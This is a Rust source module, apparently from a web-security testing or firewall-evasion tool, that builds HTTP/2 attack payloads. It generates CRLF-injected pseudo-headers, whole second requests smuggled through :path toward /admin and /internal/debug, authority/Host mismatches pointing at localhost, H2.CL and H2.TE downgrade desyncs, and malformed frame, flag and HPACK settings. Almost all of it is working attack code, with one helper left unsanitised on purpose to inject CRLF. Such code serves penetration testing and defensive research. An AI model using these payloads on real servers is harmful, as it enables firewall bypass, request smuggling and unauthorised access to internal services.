//! HTTP/2 frame-level evasion and downgrade techniques.

use crate::safety::sanitize_input;

/// An HTTP/2 evasion technique descriptor.
#[derive(Debug, Clone)]
pub struct H2Evasion {
    pub name: &'static str,
    pub description: &'static str,
    pub pseudo_headers: Vec<(String, String)>,
    pub headers: Vec<(String, String)>,
    pub needs_continuation_split: bool,
    pub target_flaw: H2TargetFlaw,
    pub end_stream: Option<bool>,
    pub end_headers: Option<bool>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum H2TargetFlaw {
    ProtocolDowngrade,
    PartialFrameInspection,
    LaxHeaderValidation,
    PseudoHeaderMismatch,
    PaddingConfusion,
    MethodOverride,
    HpackDesync,
    FlagGating,
    FlowControl,
    ConnectionState,
    StreamIdValidation,
}

/// Continuation frame split descriptor.
#[derive(Debug, Clone)]
pub struct ContinuationSplit {
    pub headers_frame: Vec<(String, String)>,
    pub continuation_frames: Vec<Vec<(String, String)>>,
    pub description: String,
}

/// Padding configuration.
#[derive(Debug, Clone)]
pub struct H2Padding {
    pub data_padding: u8,
    pub headers_padding: u8,
    pub inject_priority_frames: bool,
    pub description: String,
    pub malformed: bool,
}

/// HPACK table manipulation.
#[derive(Debug, Clone)]
pub struct HpackTableManipulation {
    pub table_size: u32,
    pub description: String,
}

/// SETTINGS frame bombardment.
#[derive(Debug, Clone)]
pub struct H2SettingsFrame {
    pub setting_id: u16,
    pub value: u32,
    pub description: String,
}

/// Stream ID manipulation.
#[derive(Debug, Clone)]
pub struct H2StreamId {
    pub id: u32,
    pub description: String,
}

/// Flag manipulation descriptor.
#[derive(Debug, Clone)]
pub struct H2Flags {
    pub end_stream: bool,
    pub end_headers: bool,
    pub description: String,
}

fn evasion(name: &'static str, desc: &'static str, flaw: H2TargetFlaw) -> H2Evasion {
    H2Evasion {
        name,
        description: desc,
        pseudo_headers: Vec::new(),
        headers: Vec::new(),
        needs_continuation_split: false,
        target_flaw: flaw,
        end_stream: None,
        end_headers: None,
    }
}

pub fn crlf_in_pseudo_headers(
    path: &str,
    smuggled_header: &str,
    smuggled_value: &str,
) -> H2Evasion {
    let path = sanitize_input(path).unwrap();
    let h = sanitize_input(smuggled_header).unwrap();
    let v = sanitize_input(smuggled_value).unwrap();
    H2Evasion {
        name: "H2 CRLF Pseudo-Header Injection",
        description: "Inject CRLF in :path to smuggle headers during downgrade",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), format!("{path}\r\n{h}: {v}")),
            (":scheme".into(), "https".into()),
        ],
        headers: Vec::new(),
        needs_continuation_split: false,
        target_flaw: H2TargetFlaw::ProtocolDowngrade,
        end_stream: None,
        end_headers: None,
    }
}

pub fn crlf_request_smuggle(path: &str, smuggled_path: &str) -> H2Evasion {
    let path = sanitize_input(path).unwrap();
    let smuggled = sanitize_input(smuggled_path).unwrap();
    let req = format!("{path}\r\nHost: internal\r\n\r\nGET {smuggled} HTTP/1.1\r\nHost: internal");
    H2Evasion {
        name: "H2 CRLF Request Smuggling",
        description: "Smuggle a complete second request via CRLF in :path",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), req),
            (":scheme".into(), "https".into()),
        ],
        ..evasion("", "", H2TargetFlaw::ProtocolDowngrade)
    }
}

/// Build a regular-header CRLF injection probe.
///
/// **Deliberately unsanitised.** This function exists *to* produce
/// CRLF-injected payloads — it's the technique under test, not a bug.
/// Callers must only pass this through HTTP/2 codecs that tolerate
/// the injection (HPACK rejects it; raw frame writers do not). For
/// every other H2Evasion helper, header inputs ARE sanitised — see
/// the contract on `authority_host_mismatch`.
pub fn crlf_in_regular_header(header: &str, value: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 CRLF Regular Header",
        description: "Inject CRLF into a regular header value",
        headers: vec![(header.into(), format!("{value}\r\nX-Injected: 1"))],
        ..evasion("", "", H2TargetFlaw::ProtocolDowngrade)
    }
}

pub fn crlf_in_header_name(name_prefix: &str, name_suffix: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 CRLF Header Name",
        description: "Inject CRLF into a header name",
        headers: vec![(format!("{name_prefix}\r\n{name_suffix}"), "value".into())],
        ..evasion("", "", H2TargetFlaw::ProtocolDowngrade)
    }
}

pub fn mixed_case_headers() -> Vec<H2Evasion> {
    [
        "Content-Type",
        "Transfer-Encoding",
        "Content-Length",
        "X-Forwarded-For",
    ]
    .iter()
    .map(|h| H2Evasion {
        name: "H2 Mixed-Case Header",
        description: "Uppercase header name to bypass lowercase rules",
        headers: vec![(h.to_string(), "value".into())],
        ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
    })
    .collect()
}

pub fn authority_host_mismatch(safe_host: &str, target_host: &str) -> H2Evasion {
    // Sanitise both host inputs — every other public function in this
    // module that takes user strings runs sanitize_input first, except
    // crlf_in_regular_header / crlf_in_pseudo_headers which deliberately
    // inject CRLF as the technique under test. Without this, a caller
    // passing `safe_host = "example.com\r\nX-Injected: 1"` would get a
    // CRLF-injected header pair through the `headers` Vec, bypassing
    // the same sanitisation used everywhere else.
    let safe_host = sanitize_input(safe_host).unwrap_or_default();
    let target_host = sanitize_input(target_host).unwrap_or_default();
    H2Evasion {
        name: "H2 Authority/Host Mismatch",
        description: "Set :authority to safe host but add Host header pointing to target",
        pseudo_headers: vec![(":authority".into(), safe_host)],
        headers: vec![("host".into(), target_host)],
        ..evasion("", "", H2TargetFlaw::PseudoHeaderMismatch)
    }
}

pub fn double_host(primary: &str, secondary: &str) -> H2Evasion {
    let primary = sanitize_input(primary).unwrap_or_default();
    let secondary = sanitize_input(secondary).unwrap_or_default();
    H2Evasion {
        name: "H2 Double Host",
        description: "Send :authority and Host header with different values",
        pseudo_headers: vec![(":authority".into(), primary)],
        headers: vec![("host".into(), secondary)],
        ..evasion("", "", H2TargetFlaw::PseudoHeaderMismatch)
    }
}

pub fn split_header_to_continuation(
    payload_header: &str,
    payload_value: &str,
) -> ContinuationSplit {
    ContinuationSplit {
        headers_frame: vec![
            (":method".into(), "GET".into()),
            (":path".into(), "/".into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), "example.com".into()),
        ],
        continuation_frames: vec![vec![(payload_header.into(), payload_value.into())]],
        description: format!("Split '{payload_header}' into CONTINUATION"),
    }
}

pub fn split_path_across_frames(path: &str) -> ContinuationSplit {
    let mid = path
        .char_indices()
        .nth(path.chars().count() / 2)
        .map(|(i, _)| i)
        .unwrap_or(path.len());
    let (first, second) = path.split_at(mid);
    ContinuationSplit {
        headers_frame: vec![
            (":method".into(), "GET".into()),
            (":path".into(), first.into()),
            (":scheme".into(), "https".into()),
        ],
        continuation_frames: vec![vec![(":path".into(), second.into())]],
        description: format!("Split :path '{path}' across frames"),
    }
}

pub fn split_pseudo_after_regular() -> ContinuationSplit {
    ContinuationSplit {
        headers_frame: vec![
            (":method".into(), "GET".into()),
            ("x-regular".into(), "value".into()),
        ],
        continuation_frames: vec![vec![
            (":path".into(), "/".into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), "example.com".into()),
        ]],
        description: "Pseudo-headers in CONTINUATION after regular header".into(),
    }
}

pub fn padding_configurations() -> Vec<H2Padding> {
    vec![
        H2Padding {
            data_padding: 255,
            headers_padding: 0,
            inject_priority_frames: false,
            description: "Max DATA padding".into(),
            malformed: false,
        },
        H2Padding {
            data_padding: 0,
            headers_padding: 255,
            inject_priority_frames: false,
            description: "Max HEADERS padding".into(),
            malformed: false,
        },
        H2Padding {
            data_padding: 128,
            headers_padding: 128,
            inject_priority_frames: true,
            description: "Mixed padding + PRIORITY".into(),
            malformed: false,
        },
        H2Padding {
            data_padding: 1,
            headers_padding: 1,
            inject_priority_frames: true,
            description: "Minimal padding + PRIORITY".into(),
            malformed: false,
        },
        H2Padding {
            data_padding: 0,
            headers_padding: 0,
            inject_priority_frames: false,
            description: "Malformed padding length".into(),
            malformed: true,
        },
    ]
}

pub fn method_override(path: &str, host: &str, override_method: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 Method Override",
        description: "Use :method=GET but override header for actual method",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), path.into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), host.into()),
        ],
        headers: vec![
            ("x-http-method-override".into(), override_method.into()),
            ("x-method-override".into(), override_method.into()),
        ],
        ..evasion("", "", H2TargetFlaw::MethodOverride)
    }
}

pub fn method_anomaly(path: &str, host: &str, method: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 Method Anomaly",
        description: "Use anomalous :method value",
        pseudo_headers: vec![
            (":method".into(), method.into()),
            (":path".into(), path.into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), host.into()),
        ],
        ..evasion("", "", H2TargetFlaw::MethodOverride)
    }
}

pub fn scheme_confusion(path: &str, host: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 Scheme Confusion",
        description: "Send :scheme=http over TLS",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), path.into()),
            (":scheme".into(), "http".into()),
            (":authority".into(), host.into()),
        ],
        ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
    }
}

pub fn exotic_scheme(path: &str, host: &str) -> Vec<H2Evasion> {
    vec!["ftp", "javascript", "file", "gopher"]
        .into_iter()
        .map(|s| H2Evasion {
            name: "H2 Exotic Scheme",
            description: "Non-standard :scheme",
            pseudo_headers: vec![
                (":method".into(), "GET".into()),
                (":path".into(), path.into()),
                (":scheme".into(), s.into()),
                (":authority".into(), host.into()),
            ],
            ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
        })
        .collect()
}

pub fn duplicate_pseudo_header(path: &str, host: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 Duplicate Pseudo-Header",
        description: "Duplicate :path",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), "/".into()),
            (":path".into(), path.into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), host.into()),
        ],
        ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
    }
}

pub fn duplicate_method(host: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 Duplicate :method",
        description: "Two :method pseudo-headers",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":method".into(), "POST".into()),
            (":path".into(), "/".into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), host.into()),
        ],
        ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
    }
}

pub fn duplicate_scheme(host: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 Duplicate :scheme",
        description: "Two :scheme pseudo-headers",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), "/".into()),
            (":scheme".into(), "https".into()),
            (":scheme".into(), "http".into()),
            (":authority".into(), host.into()),
        ],
        ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
    }
}

pub fn duplicate_authority(host: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 Duplicate :authority",
        description: "Two :authority pseudo-headers",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), "/".into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), "safe.com".into()),
            (":authority".into(), host.into()),
        ],
        ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
    }
}

pub fn empty_authority(path: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 Empty :authority",
        description: "Empty :authority pseudo-header",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), path.into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), "".into()),
        ],
        ..evasion("", "", H2TargetFlaw::PseudoHeaderMismatch)
    }
}

pub fn missing_authority(path: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 Missing :authority",
        description: "Omit :authority entirely",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), path.into()),
            (":scheme".into(), "https".into()),
        ],
        ..evasion("", "", H2TargetFlaw::PseudoHeaderMismatch)
    }
}

pub fn invalid_path_chars() -> Vec<H2Evasion> {
    vec!["\x00", " ", "\t"]
        .into_iter()
        .map(|c| H2Evasion {
            name: "H2 Invalid :path",
            description: ":path contains forbidden character",
            pseudo_headers: vec![
                (":method".into(), "GET".into()),
                (":path".into(), format!("/admin{c}test", c = c)),
                (":scheme".into(), "https".into()),
                (":authority".into(), "example.com".into()),
            ],
            ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
        })
        .collect()
}

pub fn status_in_request(path: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 :status in Request",
        description: "Inject :status into request HEADERS",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), path.into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), "example.com".into()),
            (":status".into(), "200".into()),
        ],
        ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
    }
}

pub fn pseudo_header_reordering(path: &str, host: &str) -> Vec<H2Evasion> {
    vec![
        vec![
            (":path".into(), path.into()),
            (":method".into(), "GET".into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), host.into()),
        ],
        vec![
            (":method".into(), "GET".into()),
            (":scheme".into(), "https".into()),
            (":path".into(), path.into()),
            (":authority".into(), host.into()),
        ],
    ]
    .into_iter()
    .map(|h| H2Evasion {
        name: "H2 Pseudo-Header Reordering",
        description: "Violate required pseudo-header order",
        pseudo_headers: h,
        ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
    })
    .collect()
}

pub fn regular_header_before_pseudo() -> H2Evasion {
    H2Evasion {
        name: "H2 Regular Before Pseudo",
        description: "Regular header appears before pseudo-headers",
        pseudo_headers: vec![
            ("x-regular".into(), "value".into()),
            (":method".into(), "GET".into()),
            (":path".into(), "/".into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), "example.com".into()),
        ],
        ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
    }
}

pub fn h2_cl(host: &str) -> H2Evasion {
    H2Evasion {
        name: "H2.CL Downgrade",
        description: "Inject content-length into HTTP/2 headers for H2->H1 desync",
        pseudo_headers: vec![
            (":method".into(), "POST".into()),
            (":path".into(), "/".into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), host.into()),
        ],
        headers: vec![("content-length".into(), "6".into())],
        ..evasion("", "", H2TargetFlaw::ProtocolDowngrade)
    }
}

pub fn h2_te(host: &str) -> H2Evasion {
    H2Evasion {
        name: "H2.TE Downgrade",
        description: "Inject transfer-encoding into HTTP/2 headers for H2->H1 desync",
        pseudo_headers: vec![
            (":method".into(), "POST".into()),
            (":path".into(), "/".into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), host.into()),
        ],
        headers: vec![("transfer-encoding".into(), "chunked".into())],
        ..evasion("", "", H2TargetFlaw::ProtocolDowngrade)
    }
}

pub fn alpn_h2c() -> H2Evasion {
    H2Evasion {
        name: "ALPN h2c",
        description: "Exploit ALPN to force h2c downgrade",
        headers: vec![("alpn-protocol".into(), "h2c".into())],
        ..evasion("", "", H2TargetFlaw::ProtocolDowngrade)
    }
}

pub fn settings_bombardment() -> Vec<H2SettingsFrame> {
    vec![
        H2SettingsFrame {
            setting_id: 2,
            value: 0,
            description: "ENABLE_PUSH=0".into(),
        },
        H2SettingsFrame {
            setting_id: 3,
            value: 0,
            description: "MAX_CONCURRENT_STREAMS=0".into(),
        },
        H2SettingsFrame {
            setting_id: 4,
            value: 0,
            description: "INITIAL_WINDOW_SIZE=0".into(),
        },
        H2SettingsFrame {
            setting_id: 5,
            value: 16_777_215,
            description: "MAX_FRAME_SIZE=max".into(),
        },
        H2SettingsFrame {
            setting_id: 5,
            value: u32::MAX,
            description: "MAX_FRAME_SIZE=overflow".into(),
        },
    ]
}

pub fn window_update_desync() -> Vec<H2StreamId> {
    vec![
        H2StreamId {
            id: 0,
            description: "WINDOW_UPDATE stream 0 huge".into(),
        },
        H2StreamId {
            id: 1,
            description: "WINDOW_UPDATE stream 1 zero".into(),
        },
    ]
}

pub fn rst_stream_injection() -> Vec<H2StreamId> {
    vec![
        H2StreamId {
            id: 1,
            description: "RST_STREAM on active stream".into(),
        },
        H2StreamId {
            id: 3,
            description: "RST_STREAM on idle stream".into(),
        },
    ]
}

pub fn goaway_injection() -> Vec<H2StreamId> {
    vec![
        H2StreamId {
            id: u32::MAX,
            description: "GOAWAY last-stream-id max".into(),
        },
        H2StreamId {
            id: 0,
            description: "GOAWAY last-stream-id 0".into(),
        },
    ]
}

pub fn invalid_stream_ids() -> Vec<H2StreamId> {
    vec![
        H2StreamId {
            id: 0,
            description: "Stream ID 0 (reserved)".into(),
        },
        H2StreamId {
            id: 2,
            description: "Even stream ID (server push)".into(),
        },
    ]
}

pub fn flag_manipulations() -> Vec<H2Flags> {
    vec![
        H2Flags {
            end_stream: false,
            end_headers: true,
            description: "No END_STREAM on body request".into(),
        },
        H2Flags {
            end_stream: true,
            end_headers: false,
            description: "END_STREAM without END_HEADERS".into(),
        },
        H2Flags {
            end_stream: false,
            end_headers: false,
            description: "Neither flag set".into(),
        },
    ]
}

pub fn hpack_table_manipulations() -> Vec<HpackTableManipulation> {
    vec![
        HpackTableManipulation {
            table_size: 0,
            description: "Zero table size".into(),
        },
        HpackTableManipulation {
            table_size: 65535,
            description: "Maximum table size".into(),
        },
        HpackTableManipulation {
            table_size: 1,
            description: "Tiny table".into(),
        },
        HpackTableManipulation {
            table_size: 16384,
            description: "Non-standard table size".into(),
        },
        HpackTableManipulation {
            table_size: u32::MAX,
            description: "Extreme table size".into(),
        },
    ]
}

pub fn all_evasions(path: &str, host: &str) -> Vec<H2Evasion> {
    let mut evasions = vec![
        crlf_in_pseudo_headers(path, "X-Forwarded-For", "127.0.0.1"),
        crlf_in_pseudo_headers(path, "Transfer-Encoding", "chunked"),
        crlf_request_smuggle(path, "/admin"),
        crlf_request_smuggle(path, "/internal/debug"),
        crlf_in_regular_header("user-agent", "Mozilla/5.0"),
        crlf_in_header_name("x", "foo: bar"),
        authority_host_mismatch(host, "localhost"),
        authority_host_mismatch(host, "127.0.0.1"),
        double_host(host, "internal.service"),
        method_override(path, host, "POST"),
        method_override(path, host, "PUT"),
        method_anomaly(path, host, "CONNECT"),
        method_anomaly(path, host, "PRI"),
        scheme_confusion(path, host),
        duplicate_pseudo_header(path, host),
        duplicate_method(host),
        duplicate_scheme(host),
        duplicate_authority(host),
        empty_authority(path),
        missing_authority(path),
        status_in_request(path),
        regular_header_before_pseudo(),
        h2_cl(host),
        h2_te(host),
        alpn_h2c(),
    ];
    evasions.extend(mixed_case_headers());
    evasions.extend(exotic_scheme(path, host));
    evasions.extend(invalid_path_chars());
    evasions.extend(pseudo_header_reordering(path, host));
    evasions
}

#[cfg(test)]
#[path = "h2_evasion_tests.rs"]
mod tests;
